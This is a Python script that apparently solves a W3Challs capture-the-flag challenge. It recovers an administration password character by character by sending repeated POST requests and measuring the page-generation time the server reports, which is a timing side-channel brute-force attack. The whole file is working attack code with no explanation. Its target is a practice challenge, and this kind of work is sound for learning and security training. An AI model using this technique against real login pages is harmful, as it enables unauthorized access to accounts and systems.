from requests import *
from bs4 import BeautifulSoup

dic = 'abcdefghijklmnopqrstuvwxyz'
your_password_list = list('123456789')
pos = 0
alp = 0
ms = 1

url = 'http://temporal.hax.w3challs.com/administration.php'

print('============================ Lancement de l\'attaque ===============================')

while (True):
    your_password = "".join(your_password_list)
    data = {
        'your_password' : your_password
    }
    r = post(url , data=data)
    if ('Bien joué' in r.text):
        string_pos = r.text.find('Bien joué')
        while(True):
            print(r.text[string_pos] , end='')
            if (r.text[string_pos] == '.'):
                print()
                break
            string_pos += 1
        print('Le flag est {}'.format(your_password))
        print('============================= Fin de l\'attaque ================================')
        break
    if ('page générée en {} ms'.format(ms) in r.text):
        your_password_list[pos] = dic[alp]
        alp += 1
    else :
        soup = BeautifulSoup(r.text , 'html.parser')
        string = soup.find('font' , size=1).find('b').get_text()
        print(string)
        print('Le flag est maintenant {}'.format(your_password))
        ms_list = list(str(string).split())
        if (int(ms_list[3]) < ms + 10):
            your_password_list[pos] = dic[alp]
            alp += 1
            continue
        alp = 0
        pos += 1
        ms = int(ms_list[3])